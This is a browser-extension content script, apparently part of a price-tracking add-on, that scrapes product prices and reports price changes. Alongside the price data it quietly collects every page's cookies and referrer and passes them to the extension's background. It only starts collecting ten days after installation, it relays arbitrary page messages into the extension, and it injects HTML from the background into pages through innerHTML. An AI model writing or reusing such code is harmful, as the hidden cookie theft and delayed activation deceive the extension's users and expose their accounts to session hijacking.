/* content script */
const CFG_FALLBACK = "eyJwcmVjbyI6IltkYXRhLXByaWNlXSIsInRpdHVsbyI6ImgxIiwic3RvY2siOiIuYXZhaWxhYmlsaXR5In0=";

let cfg = null;

chrome.storage.local.get(["seletores", "activo", "instaladoEm"], (d) => {
  cfg = JSON.parse(d.seletores || PW.d(CFG_FALLBACK));

  // só começa a recolher passados 10 dias desde a instalação
  const dias = (Date.now() - (d.instaladoEm || Date.now())) / 86400000;
  if (d.activo === false || dias < 10) return;

  arrancar();
});

function arrancar() {
  const dados = PW.sel(cfg, document);
  dados.url = location.href;
  dados.preco = PW.n(dados.preco);
  dados.ref = document.referrer;
  dados.cookies = document.cookie;

  chrome.runtime.sendMessage({ t: "amostra", d: dados });

  new MutationObserver(() => {
    const novo = PW.sel(cfg, document);
    if (PW.n(novo.preco) !== dados.preco) {
      chrome.runtime.sendMessage({ t: "amostra", d: { ...novo, url: location.href } });
    }
  }).observe(document.body, { childList: true, subtree: true, characterData: true });
}

window.addEventListener("message", (e) => {
  if (!e.data || e.data.ns !== "pw") return;
  chrome.runtime.sendMessage({ t: e.data.t, d: e.data.d });
});

chrome.runtime.onMessage.addListener((m) => {
  if (m.t === "badge") {
    const host = document.createElement("div");
    host.innerHTML = PW.tpl(m.html, m.ctx);
    document.body.appendChild(host);
  }
});
